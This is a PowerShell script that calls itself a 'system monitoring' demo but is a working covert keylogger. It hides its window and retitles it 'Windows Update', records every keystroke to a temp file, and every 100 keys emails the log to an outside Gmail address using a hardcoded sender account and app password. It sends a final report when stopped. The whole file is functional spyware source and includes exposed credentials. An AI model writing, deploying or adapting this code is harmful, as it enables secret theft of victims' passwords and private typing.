<# 
KEYSTROKE MONITORING SCRIPT - SYSTEM ANALYTICS TOOL
SYNOPSIS: This script demonstrates system monitoring techniques
#>

# Hide window
$signature = @'
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
'@
Add-Type -MemberDefinition $signature -Name Win32ShowWindowAsync -Namespace Win32Functions

$process = Get-Process -Id $PID
$hwnd = $process.MainWindowHandle
if ($hwnd -ne [IntPtr]::Zero) {
    [Win32Functions.Win32ShowWindowAsync]::ShowWindowAsync($hwnd, 0)
}
$host.UI.RawUI.WindowTitle = "Windows Update"

# API for keyboard monitoring
$apiCode = @'
[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, 
    System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int GetKeyboardLayout(int threadId);

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpkeystate,
    System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
'@

Add-Type -MemberDefinition $apiCode -Name 'Keyboard' -Namespace 'Win32'

# Log file
$LogFile = "$env:TEMP\system_log.txt"

# Start logging
"=== SYSTEM MONITORING STARTED ===" | Out-File $LogFile -Encoding UTF8
"Date: $(Get-Date)" | Out-File $LogFile -Encoding UTF8 -Append
"User: $env:USERNAME" | Out-File $LogFile -Encoding UTF8 -Append
"Computer: $env:COMPUTERNAME" | Out-File $LogFile -Encoding UTF8 -Append
"==================================" | Out-File $LogFile -Encoding UTF8 -Append

# Email settings
$From = "harisoncane@gmail.com"
$To = "efeaslan1995@gmail.com"
$appPassword = "zdfeitrgdejhktrc"

# Gmail SMTP settings
$SMTP = "smtp.gmail.com"
$SMTPPort = 587

# Create credentials
$SecurePassword = ConvertTo-SecureString $appPassword -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($From, $SecurePassword)

$counter = 0

# Get keyboard layout ID
$hkl = [Win32.Keyboard]::GetKeyboardLayout(0)

# Console message
Write-Host "`n=== SYSTEM MONITORING ACTIVE ===" -ForegroundColor Cyan
Write-Host "Monitoring keyboard activity..." -ForegroundColor Green
Write-Host "Exit: Press Ctrl+C" -ForegroundColor Red

try {
    while($true) {
        Start-Sleep -Milliseconds 5
        
        # Scan all key codes (8-254)
        for($keyCode = 8; $keyCode -le 254; $keyCode++) {
            $state = [Win32.Keyboard]::GetAsyncKeyState($keyCode)
            
            if($state -eq -32767) {  # Key pressed
                $counter++
                
                # Check Shift, Ctrl, Alt states
                $shiftState = [Win32.Keyboard]::GetAsyncKeyState(16)  # Shift
                $ctrlState = [Win32.Keyboard]::GetAsyncKeyState(17)   # Ctrl
                $altState = [Win32.Keyboard]::GetAsyncKeyState(18)    # Alt
                
                # Get keyboard state
                $keyboardState = New-Object Byte[] 256
                [Win32.Keyboard]::GetKeyboardState($keyboardState)
                
                # Convert key to character
                $virtualKey = [Win32.Keyboard]::MapVirtualKey($keyCode, 3)
                $charBuffer = New-Object System.Text.StringBuilder(5)
                
                # Use ToUnicodeEx for character support
                $result = [Win32.Keyboard]::ToUnicodeEx($keyCode, $virtualKey, $keyboardState, 
                    $charBuffer, $charBuffer.Capacity, 0, $hkl)
                
                $keyChar = ""
                
                # Handle special keys
                if($keyCode -eq 8) { $keyChar = "[BS]" }
                elseif($keyCode -eq 9) { $keyChar = "[TAB]" }
                elseif($keyCode -eq 13) { $keyChar = "`r`n" }
                elseif($keyCode -eq 27) { $keyChar = "[ESC]" }
                elseif($keyCode -eq 32) { $keyChar = " " }
                elseif($keyCode -eq 46) { $keyChar = "[DEL]" }
                elseif($keyCode -eq 37) { $keyChar = "[LEFT]" }
                elseif($keyCode -eq 38) { $keyChar = "[UP]" }
                elseif($keyCode -eq 39) { $keyChar = "[RIGHT]" }
                elseif($keyCode -eq 40) { $keyChar = "[DOWN]" }
                elseif($result -gt 0) {
                    # Character received
                    $keyChar = $charBuffer.ToString()
                    
                    # Shift control (uppercase/lowercase)
                    if($shiftState -ne 0) {
                        # Special handling for Turkish characters
                        $keyChar = switch($keyChar) {
                            'i' { 'İ' }
                            'ı' { 'I' }
                            'ğ' { 'Ğ' }
                            'ü' { 'Ü' }
                            'ş' { 'Ş' }
                            'ö' { 'Ö' }
                            'ç' { 'Ç' }
                            default { $keyChar.ToUpper() }
                        }
                    }
                }
                
                # Write to log file
                if($keyChar -ne "") {
                    Add-Content -Path $LogFile -Value $keyChar -NoNewline -Encoding UTF8
                }
                
                # Send email every 100 characters
                if($counter -ge 100) {
                    try {
                        $Subject = "Keylogs - $env:COMPUTERNAME"
                        $Body = @"
System Activity Report
=====================
Computer: $env:COMPUTERNAME
User: $env:USERNAME
Date: $(Get-Date -Format 'MM/dd/yyyy HH:mm:ss')
Total Keystrokes: $counter

Activity log attached.

"@
                        
                        # Send via Gmail (with SSL)
                        Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body `
                            -Attachments $LogFile -SmtpServer $SMTP -Port $SMTPPort `
                            -UseSsl -Credential $Credential -Encoding UTF8
                        
                        Write-Host "Report sent: $counter keystrokes logged" -ForegroundColor Green
                        
                        # Clear log file after sending
                        "=== NEW SESSION ===" | Out-File $LogFile -Force -Encoding UTF8
                        "$(Get-Date) - Monitoring continues..." | Out-File $LogFile -Encoding UTF8 -Append
                        
                        # Reset counter
                        $counter = 0
                        
                        # Wait to avoid Gmail spam protection
                        Start-Sleep -Seconds 5
                        
                    } catch {
                        Write-Host "Email failed: $($_.Exception.Message)" -ForegroundColor Red
                        Write-Host "Waiting 5 seconds..." -ForegroundColor Yellow
                        Start-Sleep -Seconds 5
                    }
                }
            }
        }
    }
} catch {
    # Error handling
    Write-Host "`nScript stopped." -ForegroundColor Red
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    
    # Send final report
    try {
        $Subject = "Final Report - $env:COMPUTERNAME"
        $Body = "Monitoring ended. Total $counter keystrokes logged."
        
        Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body `
            -Attachments $LogFile -SmtpServer $SMTP -Port $SMTPPort `
            -UseSsl -Credential $Credential -Encoding UTF8
            
        Write-Host "Final report sent." -ForegroundColor Green
    } catch {
        Write-Host "Final report failed to send." -ForegroundColor Red
    }
} finally {
    # Cleanup
    Write-Host "`n=== MONITORING ENDED ===" -ForegroundColor Cyan
}